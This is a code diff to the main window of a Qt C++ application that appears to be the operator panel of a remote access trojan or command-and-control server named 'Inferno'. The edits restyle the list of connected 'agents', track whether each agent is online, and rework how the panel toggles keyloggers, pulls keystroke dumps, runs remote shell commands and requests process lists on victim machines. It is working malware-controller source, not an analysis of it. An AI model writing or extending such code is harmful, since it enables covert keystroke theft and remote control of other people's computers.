@@ -2,6 +2,7 @@
 #include "../include/DataStreamWidget.hpp"
 #include "../include/CommandDialog.hpp"
 #include "../include/Inferno_Database.hpp"
+#include "../include/AgentCardDialog.hpp"
 #include <QVBoxLayout>
 #include <QHBoxLayout>
 #include <QFile>
@@ -109,9 +110,28 @@ void MainWindow::setupUI() {
     agentHeader->addWidget(m_btnScan);
     agentLayout->addLayout(agentHeader);
     
-    m_agentList->setIconSize(QSize(24, 24));
+    m_agentList->setIconSize(QSize(36, 36)); // Increased Icon Size
+    m_agentList->setStyleSheet(
+        "QListWidget { background: #000; border: none; font-size: 14px; color: #00ff41; outline: none; }"
+        "QListWidget::item { padding: 12px; margin: 2px; border-bottom: 1px solid #111; }"
+        "QListWidget::item:selected { background: #0a0a0a; border: 2px solid #00ff41; color: #fff; border-radius: 4px; }"
+        "QListWidget::item:hover { background: #111; }"
+        "QScrollBar:vertical { background: #000; width: 10px; margin: 0px; }"
+        "QScrollBar::handle:vertical { background: #1a1a1a; min-height: 20px; border-radius: 5px; }"
+        "QScrollBar::handle:vertical:hover { background: #00ff41; }"
+        "QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical { height: 0px; }"
+    );
+    m_agentList->setHorizontalScrollBarPolicy(Qt::ScrollBarAlwaysOff); // Kill the ghost boxes
     m_agentList->setContextMenuPolicy(Qt::CustomContextMenu);
     connect(m_agentList, &QListWidget::customContextMenuRequested, this, &MainWindow::showAgentContextMenu);
+    connect(m_agentList, &QListWidget::itemDoubleClicked, this, [this](QListWidgetItem* item){
+        QString agentIp = item->data(Qt::UserRole).toString();
+        QString uuid = m_agentIpToUuid.value(agentIp);
+        
+        AgentProfile profile = Inferno_Database::instance().getAgentProfile(uuid);
+        AgentCardDialog dlg(profile, this);
+        dlg.exec();
+    });
     agentLayout->addWidget(m_agentList);
     mainSplitter->addWidget(agentContainer);
 
@@ -273,7 +293,10 @@ void MainWindow::onAgentConnected(const QString& ip, const QString& info) {
     auto match = uuidRegex.match(info);
     QString uuid = match.hasMatch() ? match.captured(1) : "UNKNOWN_UUID";
     qDebug() << "[MainWindow] Extracted UUID:" << uuid;
-    m_agentIpToUuid[ip] = uuid;
+    m_agentIpToUuid[ip] = uuid; // Map volatile IP to persistent UUID
+    
+    // Circle 5 Phase II: Update SQL Liveness
+    Inferno_Database::instance().setAgentOnlineStatus(uuid, true);
 
     // Register in Database
     QString hostname = "Unknown", osInfo = "Unknown";
@@ -284,8 +307,23 @@ void MainWindow::onAgentConnected(const QString& ip, const QString& info) {
     }
     Inferno_Database::instance().registerAgent(uuid, ip, hostname, osInfo);
 
-    auto* item = new QListWidgetItem(ip + " [" + hostname + "]", m_agentList);
-    item->setData(Qt::UserRole, uuid); // Store UUID in the item
+    QString displayInfo = QString("%1 (%2)").arg(ip, hostname);
+    
+    // Check if agent already in list (from a previous session)
+    QListWidgetItem* item = nullptr;
+    for (int i = 0; i < m_agentList->count(); ++i) {
+        if (m_agentList->item(i)->data(Qt::UserRole).toString() == uuid) {
+            item = m_agentList->item(i);
+            break;
+        }
+    }
+
+    if (!item) {
+        item = new QListWidgetItem("🟢 " + displayInfo, m_agentList);
+        item->setData(Qt::UserRole, ip); // STORE VOLATILE IP HERE
+    } else {
+        item->setText("🟢 " + displayInfo);
+    }
     
     QString lowerInfo = info.toLower();
     if (lowerInfo.contains("windows")) {
@@ -301,9 +339,17 @@ void MainWindow::onAgentConnected(const QString& ip, const QString& info) {
 }
 
 void MainWindow::onAgentDisconnected(const QString& ip) {
-    auto items = m_agentList->findItems(ip, Qt::MatchStartsWith);
-    for (auto* item : items) {
-        delete item;
+    QString uuid = m_agentIpToUuid.value(ip);
+    Inferno_Database::instance().setAgentOnlineStatus(uuid, false);
+
+    for (int i = 0; i < m_agentList->count(); ++i) {
+        if (m_agentList->item(i)->data(Qt::UserRole).toString() == ip) {
+            QString currentText = m_agentList->item(i)->text();
+            if (currentText.startsWith("🟢")) {
+                m_agentList->item(i)->setText("🔴" + currentText.mid(2));
+            }
+            break;
+        }
     }
     appendToTelemetry(QString("[SYSTEM] Agent %1 has disconnected").arg(ip));
     m_statusLabel->setText(QString(" Agent %1 offline").arg(ip));
@@ -416,7 +462,7 @@ void MainWindow::toggleKeylogState(bool active) {
     QListWidgetItem* item = m_agentList->currentItem();
     if (!item) return;
     
-    QString agentIp = item->text().split(" ").first();
+    QString agentIp = item->data(Qt::UserRole).toString();
     if (active) {
         m_btnKeylog->setIcon(QIcon(":/icon_eye_open.png"));
         m_server->toggleKeylogger(agentIp, true);
@@ -432,7 +478,7 @@ void MainWindow::pollKeylogger() {
     QListWidgetItem* item = m_agentList->currentItem();
     if (!item) return;
     
-    QString agentIp = item->text().split(" ").first();
+    QString agentIp = item->data(Qt::UserRole).toString();
     m_server->requestKeylogDump(agentIp);
 }
 
@@ -456,7 +502,7 @@ void MainWindow::executeShellCommand() {
         return;
     }
 
-    QString agentIp = item->text().split(" ").first();
+    QString agentIp = item->data(Qt::UserRole).toString();
     
     CommandDialog dlg(agentIp, this);
     if (dlg.exec() == QDialog::Accepted) {
@@ -472,7 +518,7 @@ void MainWindow::requestProcessList() {
      QListWidgetItem* item = m_agentList->currentItem();
     if (!item) return;
     
-    QString agentIp = item->text().split(" ").first();
+    QString agentIp = item->data(Qt::UserRole).toString();
     m_telemetryConsole->appendPlainText(QString("[LOCAL] Requesting Process List from %1").arg(agentIp));
     m_server->requestProcessList(agentIp);
 }
@@ -526,7 +572,13 @@ void MainWindow::filterKeylogStream(const QString& text) {
 void MainWindow::loadTelemetryHistory() {
     auto* current = m_agentList->currentItem();
     if (!current) return;
-    QString uuid = current->data(Qt::UserRole).toString();
+    QString ip = current->data(Qt::UserRole).toString();
+    QString uuid = m_agentIpToUuid.value(ip);
+
+    if (uuid.isEmpty()) {
+        m_telemetryConsole->appendPlainText("[ERROR] Could not resolve UUID for agent: " + ip);
+        return;
+    }
 
     m_telemetryConsole->clear();
     QString filter = m_searchBox->text();
@@ -545,7 +597,8 @@ void MainWindow::loadTelemetryHistory() {
 void MainWindow::loadKeylogHistory() {
     auto* current = m_agentList->currentItem();
     if (!current) return;
-    QString uuid = current->data(Qt::UserRole).toString();
+    QString ip = current->data(Qt::UserRole).toString();
+    QString uuid = m_agentIpToUuid.value(ip);
 
     m_keylogStream->clear();
     QString filter = m_keylogSearchBox->text();
